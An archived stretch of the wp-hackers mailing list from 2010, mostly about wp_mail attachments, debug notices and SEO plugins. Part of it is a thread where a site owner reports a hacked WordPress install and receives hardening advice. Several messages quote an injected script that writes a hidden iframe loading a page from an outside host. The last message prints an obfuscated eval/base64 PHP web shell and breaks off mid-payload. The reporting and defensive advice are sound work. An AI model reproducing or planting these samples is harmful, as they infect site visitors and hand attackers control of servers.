	<AANLkTik7OTDRcWOmLJJQRwJWd5oPYpBsLh0gekbojChz@mail.gmail.com>
Message-ID: <ee29d643-2893-4aa1-933b-9f3fb878e8ee@u17g2000yqi.googlegroups.com>

Yes that's what I did, not really the cleanest way to do this but at
least it works ;)

Thanks!

Olivier

On Oct 31, 2:26?am, Lox <lox.... at knc.nc> wrote:
> When a hook doesn t allows enought arguments, you can use a global var.
> (Ugly hack, I know)
>
> Lox
> Le 30 oct. 2010 20:31, "Olivier" <autremond... at gmail.com> a ?crit :
>
>
>
> > Thanks for your answer! I saw this action hook. The issue is that I
> > don't see how to pass parameters to it. I could use this one to pass
> > on my string attachment, this is probably the right place but how can
> > I pass on my parameters (ie the string attachment content) through
> > this action hook?
>
> > Thanks!
>
> > Olivier
>
> > On Oct 30, 4:05 am, Michael D Adams <m... at blogwaffe.com> wrote:
> >> On Fri, Oct 29, 2010 at 12:25 PM, Olivier <autremond... at gmail.com> wrote:
> >> > Hello,
>
> >> > I'd like to use the wp_mail() function with string attachment feature
> >> > of PHPMailer class. This would allow me to pass on directly the
> >> > content I want to attach without having to go through a temp file
> >> > creation which can result into problems if the directory isn't
> >> > writable.
>
> >> > Is there a way to achieve this?
>
> >> I don't know anything about the attachment feature you want to use,
> >> but the phpmailer_init hook called from wp_mail() gives you complete
> >> access to the $phpmailer object.
>
> >> Mike
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hack... at lists.automattic.comhttp://
>
> lists.automattic.com/mailman/listinfo/wp-hackers> _______________________________________________
> > wp-hackers mailing list
> > wp-hack... at lists.automattic.com
> >http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hack... at lists.automattic.comhttp://lists.automattic.com/mailman/listinfo/wp-hackers- Hide quoted text -
>
> - Show quoted text -

From banago at gmail.com  Sun Oct 31 10:29:15 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Sun, 31 Oct 2010 02:29:15 -0800
Subject: [wp-hackers] WP_DEBUG Notice
In-Reply-To: <AANLkTimRHnp=py1TU0NuCgfjae2N8a-RcKWX7HgJ5ZGS@mail.gmail.com>
References: <AANLkTikAttQXeXH7OrGTDfTssz+Rmi3kmccoM58A0GE7@mail.gmail.com>
	<AANLkTimRHnp=py1TU0NuCgfjae2N8a-RcKWX7HgJ5ZGS@mail.gmail.com>
Message-ID: <AANLkTinh+2cYQpPAJzVvWDgokNiVjM0p4qEsK+exYAyh@mail.gmail.com>

It's cool it has been addressed. I'm developing on WP 3.0.1 because I
normally develop for clients on production.

Kindly,

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 30 October 2010 10:29, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Sat, Oct 30, 2010 at 11:50 AM, Baki Goxhaj <banago at gmail.com> wrote:
>
> > I'm developing a theme and I'm getting this notice only when I visit a
> > page.
> > this does not show up on homepage or posts.
> > *
> > *
> > >
> > > *Notice*: Only variables should be assigned by reference in *
> > > /homepages/38/d285591449/htdocs/owsh.org/new/wp-includes/query.php* on
> > > line *1508*
> >
>
> If you test this on trunk, revision 16104, I think I've addressed the
> issue.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mladen.adamovic at gmail.com  Sun Oct 31 15:07:57 2010
From: mladen.adamovic at gmail.com (Mladen Adamovic)
Date: Sun, 31 Oct 2010 16:07:57 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on dreamhost)
Message-ID: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>

Hi guys,

My wordpress software instance was repeatedly hacked ... running latest
Wordpress source code and being hosted on Dreamhost.

I don't know which exploit it did use and couldn't identify it, but it was
adding the following code to my default theme footer.php:

<script>
enc =
"%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
dec = unescape(enc);
document.write(dec);
</script>

I think I'll have to migrate to Blogger, since I couldn't identify exploit
it did use.

I wanted to drop you an email anyhow since identifying exploits is
important!

From vid at zippykid.com  Sun Oct 31 15:17:30 2010
From: vid at zippykid.com (Vid Luther)
Date: Sun, 31 Oct 2010 10:17:30 -0500
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
Message-ID: <4CCD888A.4080709@zippykid.com>

Mladen,
 Instead of switching platforms completely, I would recommend first
changing hosts, go with mediatemple, godaddy, rackspace, page.ly,
wpengine, my company, or even godaddy.. their UI sucks, but their phone
support is fairly decent.

As for the exploit, it may not be a wordpress exploit, but an ftp
attack, as it's just looking for filesystem paths and injecting to it.

I'm assuming by default theme footer, you meant twentyten theme, and
footer.php ?



Mladen Adamovic wrote:
> Hi guys,
>
> My wordpress software instance was repeatedly hacked ... running latest
> Wordpress source code and being hosted on Dreamhost.
>
> I don't know which exploit it did use and couldn't identify it, but it was
> adding the following code to my default theme footer.php:
>
> <script>
> enc =
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> dec = unescape(enc);
> document.write(dec);
> </script>
>
> I think I'll have to migrate to Blogger, since I couldn't identify exploit
> it did use.
>
> I wanted to drop you an email anyhow since identifying exploits is
> important!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

-- 
Vid Luther
Founder
ZippyKid
http://zippykid.com/
210-789-0369

From banago at gmail.com  Sun Oct 31 15:27:34 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Sun, 31 Oct 2010 16:27:34 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <4CCD888A.4080709@zippykid.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<4CCD888A.4080709@zippykid.com>
Message-ID: <AANLkTi=ufYtGrxgoBidSOSVe+_b=zgQn97S9-NS+z53V@mail.gmail.com>

I agree with Vid - try switching hosts first.

Kindly,

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 31 October 2010 16:17, Vid Luther <vid at zippykid.com> wrote:

> Mladen,
>  Instead of switching platforms completely, I would recommend first
> changing hosts, go with mediatemple, godaddy, rackspace, page.ly,
> wpengine, my company, or even godaddy.. their UI sucks, but their phone
> support is fairly decent.
>
> As for the exploit, it may not be a wordpress exploit, but an ftp
> attack, as it's just looking for filesystem paths and injecting to it.
>
> I'm assuming by default theme footer, you meant twentyten theme, and
> footer.php ?
>
>
>
> Mladen Adamovic wrote:
> > Hi guys,
> >
> > My wordpress software instance was repeatedly hacked ... running latest
> > Wordpress source code and being hosted on Dreamhost.
> >
> > I don't know which exploit it did use and couldn't identify it, but it
> was
> > adding the following code to my default theme footer.php:
> >
> > <script>
> > enc =
> >
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> > withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> > dec = unescape(enc);
> > document.write(dec);
> > </script>
> >
> > I think I'll have to migrate to Blogger, since I couldn't identify
> exploit
> > it did use.
> >
> > I wanted to drop you an email anyhow since identifying exploits is
> > important!
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> --
> Vid Luther
> Founder
> ZippyKid
> http://zippykid.com/
> 210-789-0369
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From artur at design2dev.com  Sun Oct 31 15:31:27 2010
From: artur at design2dev.com (artur)
Date: Sun, 31 Oct 2010 12:31:27 -0300
Subject: [wp-hackers] Best SEO plugin?
Message-ID: <AANLkTimo-g--kSe2PW=1RO_-dX_-nXwvOH+BLn4DXn6M@mail.gmail.com>

oh wise list...

i need an easy to use SEO plugin for my WP3 multi-site subdomains/customers.
- ideally one that requires little setup,
- does all the magic out-of-the-box,
- great support,
- and lightweight code.

ive looked at HeadSpace2, Platinum, KeywordStatistics, *WPSEO, *SEOPressor..

* also i dont mind paying if it  is really worth it.

any comparison charts out there?

thanks!

From mladen.adamovic at gmail.com  Sun Oct 31 16:50:06 2010
From: mladen.adamovic at gmail.com (Mladen Adamovic)
Date: Sun, 31 Oct 2010 17:50:06 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <4CCD888A.4080709@zippykid.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<4CCD888A.4080709@zippykid.com>
Message-ID: <AANLkTimN4NsGs=sRzZN=cmipS7-LTVD1hJVtG5a7Z=_Y@mail.gmail.com>

Regarding hosting - I have other websites hosted at my dreamhost account and
they haven't been hacked hacked so far . That's good otherwise I'll have
days of work to fix it.

Godaddy has slow and unresponsive panel comparing to dreamhost - I have some
websites hosted there as well.

I understand that some individuals and companies are offering Wordpress
hosting however for me Blogger could do - and it's free. Since my blog has
around 25 readers I don't have economical reasons to pay for managed
wordpress hosting.

Regards



On Sun, Oct 31, 2010 at 4:17 PM, Vid Luther <vid at zippykid.com> wrote:

> Mladen,
>  Instead of switching platforms completely, I would recommend first
> changing hosts, go with mediatemple, godaddy, rackspace, page.ly,
> wpengine, my company, or even godaddy.. their UI sucks, but their phone
> support is fairly decent.
>
> As for the exploit, it may not be a wordpress exploit, but an ftp
> attack, as it's just looking for filesystem paths and injecting to it.
>
> I'm assuming by default theme footer, you meant twentyten theme, and
> footer.php ?
>
>
>
> Mladen Adamovic wrote:
> > Hi guys,
> >
> > My wordpress software instance was repeatedly hacked ... running latest
> > Wordpress source code and being hosted on Dreamhost.
> >
> > I don't know which exploit it did use and couldn't identify it, but it
> was
> > adding the following code to my default theme footer.php:
> >
> > <script>
> > enc =
> >
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> > withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> > dec = unescape(enc);
> > document.write(dec);
> > </script>
> >
> > I think I'll have to migrate to Blogger, since I couldn't identify
> exploit
> > it did use.
> >
> > I wanted to drop you an email anyhow since identifying exploits is
> > important!
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> --
> Vid Luther
> Founder
> ZippyKid
> http://zippykid.com/
> 210-789-0369
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From vid at zippykid.com  Sun Oct 31 16:51:32 2010
From: vid at zippykid.com (Vid Luther)
Date: Sun, 31 Oct 2010 11:51:32 -0500
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTimN4NsGs=sRzZN=cmipS7-LTVD1hJVtG5a7Z=_Y@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>	<4CCD888A.4080709@zippykid.com>
	<AANLkTimN4NsGs=sRzZN=cmipS7-LTVD1hJVtG5a7Z=_Y@mail.gmail.com>
Message-ID: <4CCD9E94.2070104@zippykid.com>

try the free wordpress.com account? :) we just want you to stick with
wordpress :)

Mladen Adamovic wrote:
> Regarding hosting - I have other websites hosted at my dreamhost account and
> they haven't been hacked hacked so far . That's good otherwise I'll have
> days of work to fix it.
>
> Godaddy has slow and unresponsive panel comparing to dreamhost - I have some
> websites hosted there as well.
>
> I understand that some individuals and companies are offering Wordpress
> hosting however for me Blogger could do - and it's free. Since my blog has
> around 25 readers I don't have economical reasons to pay for managed
> wordpress hosting.
>
> Regards
>
>
>
> On Sun, Oct 31, 2010 at 4:17 PM, Vid Luther <vid at zippykid.com> wrote:
>
>> Mladen,
>>  Instead of switching platforms completely, I would recommend first
>> changing hosts, go with mediatemple, godaddy, rackspace, page.ly,
>> wpengine, my company, or even godaddy.. their UI sucks, but their phone
>> support is fairly decent.
>>
>> As for the exploit, it may not be a wordpress exploit, but an ftp
>> attack, as it's just looking for filesystem paths and injecting to it.
>>
>> I'm assuming by default theme footer, you meant twentyten theme, and
>> footer.php ?
>>
>>
>>
>> Mladen Adamovic wrote:
>>> Hi guys,
>>>
>>> My wordpress software instance was repeatedly hacked ... running latest
>>> Wordpress source code and being hosted on Dreamhost.
>>>
>>> I don't know which exploit it did use and couldn't identify it, but it
>> was
>>> adding the following code to my default theme footer.php:
>>>
>>> <script>
>>> enc =
>>>
>> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
>>> withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
>>> dec = unescape(enc);
>>> document.write(dec);
>>> </script>
>>>
>>> I think I'll have to migrate to Blogger, since I couldn't identify
>> exploit
>>> it did use.
>>>
>>> I wanted to drop you an email anyhow since identifying exploits is
>>> important!
>>> _______________________________________________
>>> wp-hackers mailing list
>>> wp-hackers at lists.automattic.com
>>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>> --
>> Vid Luther
>> Founder
>> ZippyKid
>> http://zippykid.com/
>> 210-789-0369
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

-- 
Vid Luther
Founder
ZippyKid
http://zippykid.com/
210-789-0369

From chip at chipbennett.net  Sun Oct 31 18:15:14 2010
From: chip at chipbennett.net (Chip Bennett)
Date: Sun, 31 Oct 2010 13:15:14 -0500
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
Message-ID: <AANLkTi=PZZcwQsF6WXBWJHWXurzrJo0Mi=vrjRN2d3g3@mail.gmail.com>

Also, have you sent this report to security at wordpress.org (I think that's
the right address?). If there's any potential that it's a WordPress specific
vector - or even just WordPress being specifically targeted - they'll want
to know. But, as a previous comment indicated, it's probably a
non-WordPress-specific FTP-credential attack vector.

Chip

On Sun, Oct 31, 2010 at 10:07 AM, Mladen Adamovic <mladen.adamovic at gmail.com
> wrote:

> Hi guys,
>
> My wordpress software instance was repeatedly hacked ... running latest
> Wordpress source code and being hosted on Dreamhost.
>
> I don't know which exploit it did use and couldn't identify it, but it was
> adding the following code to my default theme footer.php:
>
> <script>
> enc =
>
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> dec = unescape(enc);
> document.write(dec);
> </script>
>
> I think I'll have to migrate to Blogger, since I couldn't identify exploit
> it did use.
>
> I wanted to drop you an email anyhow since identifying exploits is
> important!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From ozh at ozh.org  Sun Oct 31 18:15:51 2010
From: ozh at ozh.org (Ozh)
Date: Sun, 31 Oct 2010 19:15:51 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
Message-ID: <AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>

Typically not a Dreamhost issue, otherwise there would be *thousands*
of people screaming, and me in first line

Being up to date with WP is fine, but most hack on shared hosting are
not done using WP
- check file permissions <http://codex.wordpress.org/Hardening_WordPress>
- check other softwares & scripts running on your blog
- change your main/SSH/FTP password
- change your WP password

I once had a WP blog hacked on Dreamhost. A few hours of investigation
later (checking all the above + inspecting access logs) I found out
that the insecure stuff was Scuttle (a delicious clone).

On shared hosting WP is often the target, but rarely the entrance.

On Sun, Oct 31, 2010 at 4:07 PM, Mladen Adamovic
<mladen.adamovic at gmail.com> wrote:
> Hi guys,
>
> My wordpress software instance was repeatedly hacked ... running latest
> Wordpress source code and being hosted on Dreamhost.
>
> I don't know which exploit it did use and couldn't identify it, but it was
> adding the following code to my default theme footer.php:
>
> <script>
> enc =
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> dec = unescape(enc);
> document.write(dec);
> </script>
>
> I think I'll have to migrate to Blogger, since I couldn't identify exploit
> it did use.
>
> I wanted to drop you an email anyhow since identifying exploits is
> important!
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
http://ozh.org/

From banago at gmail.com  Sun Oct 31 18:18:13 2010
From: banago at gmail.com (Baki Goxhaj)
Date: Sun, 31 Oct 2010 22:48:13 +0430
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
Message-ID: <AANLkTineJVN9OEaCvBZu=HG-1hpc2XygOHJE062nH5p-@mail.gmail.com>

>
> * On shared hosting WP is often the target, but rarely the entrance.*
>

This seems so true.

Kindly,

Baki Goxhaj
www.wplancer.com | www.banago.info | www.lintuts.com


On 31 October 2010 22:45, Ozh <ozh at ozh.org> wrote:

> Typically not a Dreamhost issue, otherwise there would be *thousands*
> of people screaming, and me in first line
>
> Being up to date with WP is fine, but most hack on shared hosting are
> not done using WP
> - check file permissions <http://codex.wordpress.org/Hardening_WordPress>
> - check other softwares & scripts running on your blog
> - change your main/SSH/FTP password
> - change your WP password
>
> I once had a WP blog hacked on Dreamhost. A few hours of investigation
> later (checking all the above + inspecting access logs) I found out
> that the insecure stuff was Scuttle (a delicious clone).
>
> On shared hosting WP is often the target, but rarely the entrance.
>
> On Sun, Oct 31, 2010 at 4:07 PM, Mladen Adamovic
> <mladen.adamovic at gmail.com> wrote:
> > Hi guys,
> >
> > My wordpress software instance was repeatedly hacked ... running latest
> > Wordpress source code and being hosted on Dreamhost.
> >
> > I don't know which exploit it did use and couldn't identify it, but it
> was
> > adding the following code to my default theme footer.php:
> >
> > <script>
> > enc =
> >
> "%3Ciframe%20width%3D1%20height%3D1%20border%3D0%20frameborder%3D0%20src%3D%27http%3A//
> > withthefirstgo.com/4/amyvaojujqinjpfqx.php%27%3E%3C/iframe%3E";
> > dec = unescape(enc);
> > document.write(dec);
> > </script>
> >
> > I think I'll have to migrate to Blogger, since I couldn't identify
> exploit
> > it did use.
> >
> > I wanted to drop you an email anyhow since identifying exploits is
> > important!
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
>
>
>
> --
> http://ozh.org/
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mladen.adamovic at gmail.com  Sun Oct 31 18:51:24 2010
From: mladen.adamovic at gmail.com (Mladen Adamovic)
Date: Sun, 31 Oct 2010 19:51:24 +0100
Subject: [wp-hackers] wordpress theme script injection (hosted on
	dreamhost)
In-Reply-To: <AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
References: <AANLkTin+PRDC+Zc6VKvMGdjm-hJfNjmqrhaPmVCqYJYH@mail.gmail.com>
	<AANLkTikv7V1oXb+RN=x8Q69p0Jn+wN2TJs8rv4v0keSQ@mail.gmail.com>
Message-ID: <AANLkTimGFeij-S2vqFrBH_j9UUwpZ1J+rAxX3P-uctOd@mail.gmail.com>

The website was hacked multiple times. While I was trying to prevent it
happen again :
- I did upgrade to latest version
- changed passwords
- made fresh wordpress install, imported RSS feed of old instance
and disabled all plugins I don't use.

..and it was hacked again.

I did now checked access.logs files with grep and all what I could find
suspicious is :

access.log:69.163.128.12 - - [31/Oct/2010:03:05:04 -0700] "POST
/wp-cron.php?doing_wp_cron HTTP/1.0" 200 184 "-" "WordPress/3.0.1; "

access.log.2010-10-29:64.0.55.44 - - [29/Oct/2010:13:39:27 -0700] "POST
/wp-admin/includes/planb.php HTTP/1.1" 200 8194 "
http://blog.numbeo.com/wp-admin/includes/planb.php" "Mozilla/5.0 (Windows;
U; Windows NT 5.1; en-US; rv:1.9.2.12) Gecko/20101026 AskTbSPC2/3.8.0.12304
Firefox/3.6.12 WebMoney Advisor"

This planb.php looks fishy with it's content :
<?PHP
set_time_limit(0);
$login = "";
$pass = "";
$md5_pass = "";
eval(gzinflate(base64_decode('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